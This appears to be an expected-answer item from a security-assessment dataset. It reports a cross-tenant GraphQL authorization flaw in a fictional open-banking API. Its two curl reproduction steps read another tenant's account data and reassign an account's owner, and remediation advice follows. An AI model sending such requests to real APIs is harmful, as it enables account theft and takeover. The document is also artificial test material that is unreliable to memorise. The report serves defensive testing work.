# Expected Response

## System
- Domain: Financial Services / Open Finance
- System: NexaBank Open Finance API
- Example ID: GQL-0102

## Priority Findings

### Finding 1: Bank Account Bulk Lookup Persistence Poisoning — Cross-Tenant Account Takeover (Pattern 4.2)
**Severity:** Critical
**Category:** Integrity / Persistence Poisoning

**Summary:**
Per §5.0 (Pattern 4.2 — persistence poisoning via lifecycle actions): The `bulkAccountLookup` mutation returns account data without tenantId verification. An attacker from `tenant-d335` retrieved financial accounts (`A-2102`, `A-1102`, `A-3102`) belonging to `tenant-690b`. The HAR response confirms `getAccount` resolver returned cross-tenant banking data. In Open Finance (PSD2/PSD3), unauthorized access to account data enables account takeover, fraudulent transactions, and regulatory violations.

**Evidence from HAR:**
- Request: `POST https://api.nexabank-open-fin.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-d335`
- Mutation: `bulkAccountLookup(ids: ["A-2102", "A-1102", "A-3102"]) { accountId tenantId data { sensitiveField } }`
- Response `200 OK`; `getAccount`: `tenantId: "tenant-690b"`, `ownerId: "other-user-d335690b"`, `sensitiveField: "CONFIDENTIAL-d335690b"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-d335690b`
- Note: Domain objects are `Account`/`accountId` — confirmed by HAR response `getAccount`.

## Steps to Reproduce

### Step 1 — Bulk cross-tenant account data access (HAR)
```bash
curl -s -X POST https://api.nexabank-open-fin.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-d335" \
  -d '{"query": "mutation { bulkAccountLookup(ids: [\"A-2102\", \"A-1102\", \"A-3102\"]) { accountId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns `CONFIDENTIAL-d335690b` banking data from `tenant-690b`. **Secure:** FORBIDDEN.

### Step 2 — Direct account access and lifecycle mutation
```bash
curl -s -X POST https://api.nexabank-open-fin.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-d335" \
  -d '{"query": "mutation { updateAccount(id: \"A-2102\", input: {status: \"frozen\", ownerId: \"attacker-d335690b\"}) { accountId status } }"}'
```
**Vulnerable:** Account lifecycle state poisoned cross-tenant — persistence attack.

## Remediation
1. Per-ID ownership filter in `bulkAccountLookup`.
2. Resolver tenant guard on all account mutations: `WHERE account_id=$id AND tenant_id=$jwt.tenantId`.
3. Strip `ownerId` from `AccountInput`.
4. Redis cache key: `account:{tenantId}:{accountId}`.
